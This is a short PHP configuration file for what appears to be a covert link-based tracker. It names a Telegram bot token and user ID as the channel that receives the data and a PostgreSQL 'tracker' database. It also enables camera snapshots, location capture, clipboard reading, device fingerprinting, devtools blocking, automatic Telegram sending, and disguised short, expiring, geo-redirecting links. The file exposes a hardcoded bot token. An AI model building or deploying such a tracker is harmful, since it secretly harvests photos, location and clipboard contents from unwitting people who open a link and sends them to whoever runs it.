<?php

// Telegram settings
define('TELEGRAM_BOT_TOKEN', '7593255138:AAGq9XXv-bbKzMmONvyORoVdcpINW73wyvQ');
define('TELEGRAM_USER_ID', '6069204139');

// PostgreSQL settings (filled from Telegram bot)
define('DB_HOST', getenv('PG_HOST') ?: 'localhost');
define('DB_NAME', getenv('PG_NAME') ?: 'tracker');
define('DB_USER', getenv('PG_USER') ?: 'postgres');
define('DB_PASS', getenv('PG_PASS') ?: 'password');

// File/data paths
define('LOG_PATH', __DIR__ . '/data/log.txt');
define('PHOTO_PATH', __DIR__ . '/data/photos/');

// Feature Toggles (true/false)
$settings = [
    'camera_snapshots' => true,
    'location_capture' => true,
    'clipboard_access' => true,
    'theme_detection' => true,
    'battery_info' => true,
    'device_orientation' => true,
    'referrer_logging' => true,
    'devtools_protection' => true,
    'auto_telegram_send' => true,
    'short_links_enabled' => true,
    'geo_redirect_enabled' => true,
    'expiring_links_enabled' => true,
];

// Save in global var for access in any script
$GLOBALS['TRACKER_SETTINGS'] = $settings;